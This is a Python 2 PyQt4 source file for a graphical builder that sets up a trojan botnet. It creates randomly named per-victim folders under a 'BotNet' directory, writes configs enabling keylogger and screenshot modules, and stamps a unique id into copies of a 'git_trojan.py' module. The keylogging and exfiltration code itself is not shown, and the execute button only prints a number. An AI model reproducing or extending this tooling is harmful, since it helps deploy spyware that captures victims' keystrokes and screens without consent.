import sys
from PyQt4.QtCore import *
from PyQt4.QtGui import *
from PyQt4 import uic
import json
import base64
import random, string
import os, glob, shutil

form_class = uic.loadUiType("trojan.ui")[0]



class TrojanWindow(QMainWindow, form_class):
    def __init__(self):
        super(QMainWindow, self).__init__()
        super(form_class, self).__init__()
        self.setupUi(self)
        self.connect(self.MakeTrojan_Button, SIGNAL("clicked()"), self.MakeTrojan_Clicked)
        self.connect(self.ExecuteTrojan_Button, SIGNAL("clicked()"), self.ExecuteTrojan_Clicked)
        self.TargetNum_Button.setPlainText("0")
        self.clicked = 2
        self.noneclicked = 0
        self.Keylogger_Check = None
        self.ScreenShot_Check = None
        self.targetNum_Button = None
        self.config = {"module": ""}
        self.configAll = [{"module": "None"} for _ in range(10)]
        self.jsonDumped = None
        self.trojanFileName = 'git_trojan.py'

    def MakeTrojan_Clicked(self):
        self.Keylogger_Check = self.Keylogger_CheckBox.checkState()
        self.ScreenShot_Check = self.ScreenShot_CheckBox.checkState()
        self.targetNum_Button = self.TargetNum_Button.toPlainText()
        print self.targetNum_Button
        if int(self.targetNum_Button) is not None or 0:
            self.MakeRandomDirectory(int(self.targetNum_Button))


    def MakeRandomDirectory(self, number):
        for i in range(number):
            dirName = self.randomword(10)
            dirPath = "../BotNet/" + dirName
            if not os.path.exists(dirPath):
                self.MakeAllDirectory(dirPath)
            if int(self.Keylogger_Check) is self.clicked:
                self.jsonDumped = self.MakeConfig("keylogger", 0)
            if int(self.ScreenShot_Check) is self.clicked:
                self.jsonDumped = self.MakeConfig("ScreenShot", 1)
            if self.jsonDumped is not None:
                self.MakeAllFile(dirPath, dirName)


    def MakeConfig(self, name, number):
        self.configAll[number].__setitem__("module", name)
        dumped = json.dumps(self.configAll)
        return dumped

    def ExecuteTrojan_Clicked(self):
        print 1

    def randomword(self, length):
        return ''.join(random.choice(string.lowercase) for i in range(length))

    def MakeAllDirectory(self, dirPath):
        os.makedirs(dirPath)
        os.makedirs(dirPath + "/config")
        os.makedirs(dirPath + "/data")
        os.makedirs(dirPath + "/modules")
        os.makedirs(dirPath + "/bin")

    def MakeAllFile(self, dirPath, dirName):
        f = open(dirPath + "/config/" + dirName + ".json", 'wb').write(self.jsonDumped)
        self.CopyDir("../modules/", dirPath)
        with open(dirPath + "/modules/git_trojan.py", 'rt') as f:
            writebuffer = f.read().replace('trojan_id = "trojan_id"', 'trojan_id = "%s"' %dirName)
        with open(dirPath + "/modules/git_trojan.py", 'wt') as f:
            f.write(writebuffer)


    def MakeDir(self, path):
        if not os.path.isdir(path):
            os.mkdir(path)

    def CopyDir(self, source_item, destination_item):
        if os.path.isdir(source_item):
            self.MakeDir(destination_item)
            sub_items = glob.glob(source_item + '/*')
            for sub_item in sub_items:
                self.CopyDir(sub_item, destination_item + '/' + sub_item.split('/')[-1])
        else:
            shutil.copy(source_item, destination_item)
    

if __name__ == "__main__":
    trojan = QApplication(sys.argv)
    trojanWindow = TrojanWindow()
    trojanWindow.show()
    trojan.exec_()
